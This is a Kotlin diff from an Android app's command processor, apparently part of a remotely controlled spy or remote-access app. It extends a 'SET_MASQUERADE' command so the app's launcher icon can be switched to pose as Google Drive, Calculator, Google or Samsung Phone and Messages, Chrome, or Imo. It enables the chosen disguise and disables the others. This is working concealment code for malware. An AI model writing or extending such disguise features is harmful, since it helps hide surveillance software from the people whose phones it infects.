@@ -878,17 +878,21 @@ object CommandProcessor {
                 }
                 "SET_MASQUERADE" -> {
                     val skin = content.trim().uppercase()
-                    if (skin == "DRIVE" || skin == "CALC") {
+                    val aliasMap = mapOf(
+                        "DRIVE" to ".AliasDrive", "CALC" to ".AliasCalc",
+                        "GOOGLE_PHONE" to ".AliasGooglePhone", "GOOGLE_MSG" to ".AliasGoogleMsg",
+                        "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
+                        "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
+                        "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite"
+                    )
+
+                    if (aliasMap.containsKey(skin)) {
                         val pm = ctx.packageManager
-                        val driveAlias = android.content.ComponentName(ctx, "${ctx.packageName}.AliasDrive")
-                        val calcAlias = android.content.ComponentName(ctx, "${ctx.packageName}.AliasCalc")
-                        
-                        if (skin == "DRIVE") {
-                            pm.setComponentEnabledSetting(driveAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
-                            pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
-                        } else {
-                            pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
-                            pm.setComponentEnabledSetting(driveAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                        aliasMap.forEach { (key, aliasName) ->
+                            val comp = android.content.ComponentName(ctx, "${ctx.packageName}$aliasName")
+                            val state = if (key == skin) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
+                                        else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                            pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
                         }
                         
                         ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
@@ -897,7 +901,7 @@ object CommandProcessor {
                         status = "MASQUERADE_UPDATED: $skin"
                     } else {
                         status = "FAILED"
-                        errorMsg = "Usage: SET_MASQUERADE | DRIVE or CALC"
+                        errorMsg = "Unknown Skin: $skin"
                     }
                 }
                 "SET_TILE_STATE" -> {
